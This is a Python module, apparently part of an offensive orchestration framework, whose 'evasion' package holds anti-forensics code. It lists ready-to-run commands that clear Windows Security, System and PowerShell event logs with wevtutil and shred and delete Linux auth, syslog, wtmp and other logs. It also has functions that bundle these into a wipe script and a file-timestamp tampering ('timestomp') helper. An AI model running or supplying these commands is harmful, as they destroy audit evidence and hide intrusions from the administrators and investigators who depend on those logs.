"""orchestrator.evasion.log_wiping — compatibility shim.

The original module exposed raw command dictionaries. Those are preserved for
callers that still import them, but the canonical planner is now
`orchestrator.evasion.antiforensics`.
"""
from __future__ import annotations

from .antiforensics import AntiforensicsStep, log_wipe

LOG_PATHS = {
    "windows": {
        "security": "wevtutil cl Security",
        "system": "wevtutil cl System",
        "application": "wevtutil cl Application",
        "powershell": "wevtutil cl 'Windows PowerShell'",
        "powershell_op": "wevtutil cl 'Microsoft-Windows-PowerShell/Operational'",
    },
    "linux": {
        "syslog": "shred -z /var/log/syslog 2>/dev/null; rm -f /var/log/syslog",
        "auth": "shred -z /var/log/auth.log 2>/dev/null; rm -f /var/log/auth.log",
        "kern": "shred -z /var/log/kern.log 2>/dev/null; rm -f /var/log/kern.log",
        "lastlog": "shred -z /var/log/lastlog 2>/dev/null; rm -f /var/log/lastlog",
        "wtmp": "shred -z /var/log/wtmp 2>/dev/null; rm -f /var/log/wtmp",
        "btmp": "shred -z /var/log/btmp 2>/dev/null; rm -f /var/log/btmp",
        "messages": "shred -z /var/log/messages 2>/dev/null; rm -f /var/log/messages",
        "journal": "journalctl --rotate && journalctl --vacuum-time=1s 2>/dev/null",
    },
}


def get_wipe_commands(platform: str = "linux", targeted: list[str] | None = None) -> list[str]:
    logs = LOG_PATHS.get(platform, {})
    if targeted:
        return [v for k, v in logs.items() if k in targeted]
    return list(logs.values())


def wipe_script(platform: str = "linux", exclude: list[str] | None = None) -> str:
    commands = get_wipe_commands(platform)
    if exclude:
        commands = [c for c in commands if not any(e in c for e in exclude)]
    return "\n".join(commands) + "\n"


def timestamp_jammer(target_file: str = "", new_ts: str = "") -> str:
    from .timestomp import plan_timestomp
    if not target_file:
        return ""
    return plan_timestomp(target_file, timestamp=new_ts or None).command


def event_log_wipe_recon(platform: str = "windows") -> str:
    return "\n".join(s.command for s in log_wipe(platform=platform)) + "\n"


__all__ = [
    "LOG_PATHS", "AntiforensicsStep", "log_wipe", "get_wipe_commands",
    "wipe_script", "timestamp_jammer", "event_log_wipe_recon",
]
